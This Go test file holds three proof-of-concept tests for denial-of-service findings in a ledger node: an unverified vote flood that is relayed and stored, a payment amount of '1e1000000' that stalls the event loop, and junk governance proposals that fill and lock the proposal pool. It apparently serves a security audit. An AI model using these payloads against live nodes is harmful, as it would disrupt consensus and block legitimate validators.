package node

import (
	"encoding/json"
	"fmt"
	"math/big"
	"testing"
	"time"

	"github.com/eval-apply-labs/go-ledger/consensus"
	"github.com/eval-apply-labs/go-ledger/ledger"
	"github.com/eval-apply-labs/go-ledger/signing"
)

// countingTransport records every Broadcast so a PoC can measure how much the node amplifies an
// attacker's input.
type countingTransport struct{ votes, total int }

func (c *countingTransport) Broadcast(from string, msg Message) {
	c.total++
	if msg.Type == MsgVote {
		c.votes++
	}
}

// PoC — NODE-INPUT finding A: a vote submitted to /hdls/vote is RELAYED to every peer and STORED in
// heightVotes BEFORE its signature or validator membership is checked. So an unauthenticated client
// with no key and no validator slot can (1) make the node flood arbitrary junk to all its peers
// (amplification), (2) grow heightVotes without bound (no size cap, unlike the mempool), and
// (3) make reGossipVotes re-broadcast the whole junk set every tick. The driver's tally is the only
// thing that verifies — relay/remember do not, violating "verify before acting".
func TestPoCUnauthenticatedVoteFloodAmplifiesAndGrows(t *testing.T) {
	scheme, network := signing.Ed25519{}, "testnet"
	// Three real validators; the node under test is a NON-validator observer, so it never reaches
	// quorum alone and never decides (which would reset heightVotes mid-test).
	var vals []consensus.Validator
	for i := 0; i < 3; i++ {
		v, _ := signing.Generate(scheme, network)
		vals = append(vals, consensus.Validator{PublicKey: v.PublicKeyBase64(), Power: 1})
	}
	observer, _ := signing.Generate(scheme, network)
	ct := &countingTransport{}
	nd := New(Config{
		NetworkID: network, Scheme: scheme, Signer: observer,
		Validators:      consensus.NewValidatorSet(vals),
		TransactionCost: rat("0.1"),
		Timeout:         time.Hour, // keep the armed propose-timeout from firing during the test
		Genesis:         []ledger.Account{{PublicKey: vals[0].PublicKey, Amount: rat("100"), ValidatorNode: vals[0].PublicKey}},
	}, ct)
	// Drive the loop synchronously (no Start) — mirrors proposal_relay_test.go. As a non-proposer the
	// node only arms a timeout here; it casts no vote, so heightVotes starts empty.
	nd.startHeight()
	if len(nd.heightVotes) != 0 {
		t.Fatalf("precondition: heightVotes should start empty, got %d", len(nd.heightVotes))
	}
	ct.votes = 0 // ignore any setup broadcasts

	const flood = 5000
	for i := 0; i < flood; i++ {
		junk := consensus.Vote{
			Height:      nd.height, // the live height — readable via GET /hdls/status
			Round:       0,
			Type:        consensus.Prevote,
			BlockDigest: [32]byte{byte(i), byte(i >> 8)},
			Validator:   fmt.Sprintf("not-a-validator-%d", i),   // not in the set
			Signature:   fmt.Sprintf("garbage-signature-%d", i), // never verified before relay/remember
		}
		nd.handle(event{kind: evVote, vote: &junk})
	}

	if ct.votes != flood {
		t.Fatalf("expected the node to relay all %d junk votes (amplification); it broadcast %d", flood, ct.votes)
	}
	if len(nd.heightVotes) != flood {
		t.Fatalf("expected heightVotes to grow unbounded to %d junk entries; got %d", flood, len(nd.heightVotes))
	}
	// Sustained amplification: one re-gossip tick re-broadcasts the ENTIRE junk set to every peer.
	ct.votes = 0
	nd.reGossipVotes()
	if ct.votes != flood {
		t.Fatalf("reGossipVotes should re-flood all %d junk votes each tick; it sent %d", flood, ct.votes)
	}
	t.Logf("UNVERIFIED junk: relayed=%d, stored in heightVotes=%d, re-gossiped/tick=%d — none from a validator, none signature-checked",
		flood, len(nd.heightVotes), flood)
}

// decodePaymentFromWire decodes the exact JSON bytes a client POSTs to /hdls/pay, the same path the
// node's bounded decoder takes. A ~tens-of-bytes exponent amount expands to a multi-megabyte rational.
func decodePaymentFromWire(t *testing.T, amountLiteral string, from, to string, blockID int64) ledger.Payment {
	t.Helper()
	body := fmt.Sprintf(`{"PublicKeyFrom":%q,"PublicKeyTo":%q,"Amount":%q,"BlockID":%d}`, from, to, amountLiteral, blockID)
	if len(body) > 1<<20 {
		t.Fatalf("body %d exceeds the 1 MiB intake bound — not a valid PoC", len(body))
	}
	var p ledger.Payment
	if err := json.Unmarshal([]byte(body), &p); err != nil {
		t.Fatalf("wire decode of %d-byte body failed: %v", len(body), err)
	}
	return p
}

// PoC — NODE-INPUT finding B: the 1 MiB body bound (security.md "Bounded request bodies") does not
// bound the WORK. A ~60-byte payment whose Amount is "1e1000000" decodes to a 3.3M-bit rational;
// admitPayment — which runs ON THE SINGLE EVENT LOOP — then pays superlinear big.Rat costs
// (PaymentID→RatString, and json.Marshal in WithinMessageBound), hundreds of ms per request, and the
// attacker can replay the one signed payment indefinitely. This starves consensus.
func TestPoCHugeAmountStallsEventLoop(t *testing.T) {
	scheme, network := signing.Ed25519{}, "testnet"
	v, _ := signing.Generate(scheme, network)
	payer, _ := signing.Generate(scheme, network)
	payee, _ := signing.Generate(scheme, network)
	genesis := []ledger.Account{
		{PublicKey: v.PublicKeyBase64(), Amount: rat("100"), ValidatorNode: v.PublicKeyBase64()},
		{PublicKey: payer.PublicKeyBase64(), Amount: rat("100"), ValidatorNode: v.PublicKeyBase64()},
		{PublicKey: payee.PublicKeyBase64(), Amount: rat("1"), ValidatorNode: v.PublicKeyBase64()},
	}
	newNode := func(maxMsg int) *Node {
		return New(Config{
			NetworkID: network, Scheme: scheme, Signer: v,
			Validators:      consensus.NewValidatorSet([]consensus.Validator{{PublicKey: v.PublicKeyBase64(), Power: 1}}),
			TransactionCost: rat("0.1"), Timeout: time.Hour, MaxMessageBytes: maxMsg, MaxMempool: 10000,
			Genesis: genesis,
		}, &countingTransport{})
	}

	from, to := payer.PublicKeyBase64(), payee.PublicKeyBase64()
	normal := decodePaymentFromWire(t, "10", from, to, 1)
	huge := decodePaymentFromWire(t, "1e1000000", from, to, 1) // ~10-byte amount, 3.3M-bit rational

	// Case 1: realistic default MaxMessageBytes=2000. WithinMessageBound marshals the payment (expanding
	// the amount) on the loop before rejecting it as oversized — the cost is paid regardless.
	nd := newNode(2000)
	t0 := time.Now()
	_ = nd.admitPayment(normal)
	baseline := time.Since(t0)
	t1 := time.Now()
	_ = nd.admitPayment(huge)
	hugeCost := time.Since(t1)

	// Case 2: even with the size bound DISABLED (MaxMessageBytes=0, no marshal), the loop still pays
	// RatString via PaymentID in mem.contains — the cost is inherent to the amount magnitude.
	nd0 := newNode(0)
	_ = nd0.admitPayment(normal)
	t2 := time.Now()
	_ = nd0.admitPayment(huge)
	hugeCostNoBound := time.Since(t2)

	t.Logf("admitPayment on the event loop: normal=%v  huge(bound=2000)=%v  huge(bound=0)=%v  (attacker body ~60 bytes)",
		baseline, hugeCost, hugeCostNoBound)
	if hugeCost < 30*time.Millisecond {
		t.Fatalf("expected the huge-amount payment to burn tens+ of ms of loop time; got %v", hugeCost)
	}
	if hugeCost < 20*baseline+time.Millisecond {
		t.Fatalf("expected >=20x amplification of per-request loop cost; baseline=%v huge=%v", baseline, hugeCost)
	}
	if hugeCostNoBound < 30*time.Millisecond {
		t.Fatalf("size bound off should NOT save the loop (PaymentID still RatStrings the amount); got %v", hugeCostNoBound)
	}
}

var _ = big.NewRat

// PoC — NODE-INPUT finding C: addParameterVotes (and addReassignmentVotes) create a pool slot BEFORE
// any vote is verified, and the pool is capped at 64. So an unauthenticated client with no key and
// no validator slot can create 64 junk proposals carrying ZERO valid votes, filling the pool. Set
// each junk proposal's PreviousParametersDigest/Sequence to the current (both readable via the open
// GET /hdls/governance) and the entries even survive commit-time pruning — permanently bricking the
// pooling of any genuine validator parameter-change vote.
func TestPoCGovernancePoolFillBlocksLegitVotes(t *testing.T) {
	scheme, network := signing.Ed25519{}, "testnet"
	v, _ := signing.Generate(scheme, network) // a real validator (we hold its key, for the legit vote)
	nd := New(Config{
		NetworkID: network, Scheme: scheme, Signer: v,
		Validators:      consensus.NewValidatorSet([]consensus.Validator{{PublicKey: v.PublicKeyBase64(), Power: 1}}),
		TransactionCost: rat("0.1"), Timeout: time.Hour, MaxMessageBytes: 2000,
		Genesis: []ledger.Account{{PublicKey: v.PublicKeyBase64(), Amount: rat("100"), ValidatorNode: v.PublicKeyBase64()}},
	}, &countingTransport{})

	currentDigest := nd.parameters.Digest()
	currentSeq := nd.governanceSequence // both exposed by GET /hdls/governance

	// Attacker: 64 distinct junk changes, NO valid votes, all amending the CURRENT state (so pruning
	// keeps them). Each is Acceptable and has a distinct key (varied BlockIntervalMs).
	for i := 1; i <= 64; i++ {
		junk := ledger.ParameterChange{
			NewParameters: ledger.LedgerParameters{
				TransactionCost: rat("1"), BlockIntervalMs: int64(i), StepTimeoutMs: 1000, MaxPeers: 0, MaxMessageBytes: 2000,
			},
			PreviousParametersDigest: currentDigest,
			Sequence:                 currentSeq,
			Votes:                    nil, // not one real vote
		}
		nd.addParameterVotes(junk)
	}
	if len(nd.paramProposals) != 64 {
		t.Fatalf("expected the pool filled with 64 vote-less junk proposals; got %d", len(nd.paramProposals))
	}

	// A genuine validator now proposes a real transaction-cost change and signs a valid vote for it.
	legitParams := ledger.LedgerParameters{TransactionCost: rat("0.2"), BlockIntervalMs: 1000, StepTimeoutMs: 1000, MaxPeers: 0, MaxMessageBytes: 2000}
	vote, err := ledger.SignParameterVote(v, legitParams, currentDigest, currentSeq)
	if err != nil {
		t.Fatal(err)
	}
	legit := ledger.ParameterChange{NewParameters: legitParams, PreviousParametersDigest: currentDigest, Sequence: currentSeq, Votes: []ledger.ParameterVote{vote}}
	if nd.addParameterVotes(legit) {
		t.Fatal("a genuine validator vote was accepted — pool was not actually full")
	}
	if _, pooled := nd.paramProposals[proposalKey(legit)]; pooled {
		t.Fatal("the genuine proposal must have been refused (pool full), yet it is pooled")
	}

	// Permanence: the junk survives commit-time pruning because it amends the current digest/sequence.
	nd.pruneParameterProposals()
	if len(nd.paramProposals) != 64 {
		t.Fatalf("junk amending current state should survive pruning; %d remain", len(nd.paramProposals))
	}
	t.Logf("64 vote-less junk proposals fill and survive pruning; a real validator's valid vote is refused — governance parameter voting is bricked by an unauthenticated client")
}
